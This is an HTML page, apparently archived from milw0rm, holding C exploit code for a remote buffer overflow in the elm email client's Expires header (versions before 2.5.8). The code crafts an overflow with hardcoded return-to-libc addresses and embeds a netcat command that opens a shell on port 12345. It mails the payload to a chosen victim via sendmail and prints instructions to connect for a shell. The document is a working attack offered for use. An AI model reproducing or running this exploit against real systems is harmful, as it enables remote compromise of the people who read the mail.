<html>
<head>
<title>Elm < 2.5.8 (Expires Header) Remote Buffer Overflow Exploit</title>
<pre>
/*

  Exploit code for the bug posted by Ulf Harnhammar (metaurtelia.com)
  http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0688.html

  Probably you will need to change SYSLOC and STRLOC to work on your box

*/


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

#define BUFFER 83
#define EMAIL  &quot;tmpmail&quot;
#define STRING &quot;`nc -l -p 12345 -e /bin/sh`&amp;##&quot;
#define SYSLOC 0x42041e50
#define STRLOC 0x4001a207
#define EXTLOC 0x4202b0f0

char expire[]=&quot;\x45\x78\x70\x69\x72\x65\x73\x3A\x20&quot;;

int main(int argc, char **argv)
{
      char buffer[BUFFER];
      char *email = NULL;
      char *user = NULL;
      int i;
      long extloc, sysloc, strloc;
      FILE *fp;

      if(argc != 2) {
        puts(&quot;Usage: ./elmex &lt;user@where.com&gt;&quot;);
        exit(EXIT_FAILURE);
      }

      if(strlen(argv[1]) &gt; 50) {
              puts(&quot;[-] Sorry, email address too long!&quot;);
              exit(EXIT_FAILURE);
      }

      user = (char *)malloc(strlen(argv[1]));
      if(!user) {
              perror(&quot;malloc&quot;);
              exit(EXIT_FAILURE);
      }

      email = EMAIL;

      memset(user, '\0', strlen(argv[1]));
      memcpy(user, argv[1], strlen(argv[1]));

      puts(&quot;\nExploit for elm email client &lt; 2.5.8 overflow in Expires field&quot;);
      puts(&quot;Tested: Redhat on quiet a Sunday by c0ntex[at]open-security.org\n&quot;);

      extloc = EXTLOC;
      sysloc = SYSLOC;
      strloc = STRLOC;

      memset(buffer, '\0', BUFFER);
      memcpy(buffer, expire, strlen(expire));

      for(i = strlen(expire); i &lt; 53; i++)
              *(buffer+i) = 0x41;
      for(i = 53; i &lt; 57; i += 4)
              *(long *)&amp;buffer[i] = sysloc;
      for(i = 57; i &lt; 61; i++)
              *(long *)&amp;buffer[i] = extloc;
      for(i = 61; i &lt; 65; i += 4)
              *(long *)&amp;buffer[i] = strloc;

      memcpy(&amp;buffer[65], STRING, strlen(STRING));
      buffer[BUFFER] = '\0';

      puts(&quot;[-] Adding exploit buffer to email&quot;);

      fp = fopen(email, &quot;w&quot;);
      if(!fp) {
              perror(&quot;fopen&quot;); free(user);
              exit(EXIT_FAILURE);
      }

      fprintf(fp,
               &quot;From: User c0ntex &lt;c0ntex@open-security.org&gt; Sun Aug 21 13:37:00 2005\n&quot;
               &quot;Return-Path: &lt;c0ntex@localhost\n&quot;
               &quot;Date: Sun, 21 Aug 2005 13:37:00 %s\n&quot;
               &quot;Subject: Insecure?\n&quot;
               &quot;To: %s\n&quot;
               &quot;%s\n&quot;, STRING, user, buffer);
      fclose(fp);

      printf(&quot;[-] Emailing %s with malicious content\n&quot;, argv[1]);

      if(system(&quot;/bin/cat ./tmpmail | /usr/sbin/sendmail -t&quot;) &lt;0) {
              perror(&quot;system&quot;);  free(user);
              exit(EXIT_FAILURE);
      }

      puts(&quot;[-] Connect to system on port 12345 to get your shell\n&quot;);

      if(unlink(EMAIL) &lt;0)
              perror(&quot;unlink&quot;);

      free(user);

      return EXIT_SUCCESS;
}

// milw0rm.com [2005-08-22]
</pre>
</html>

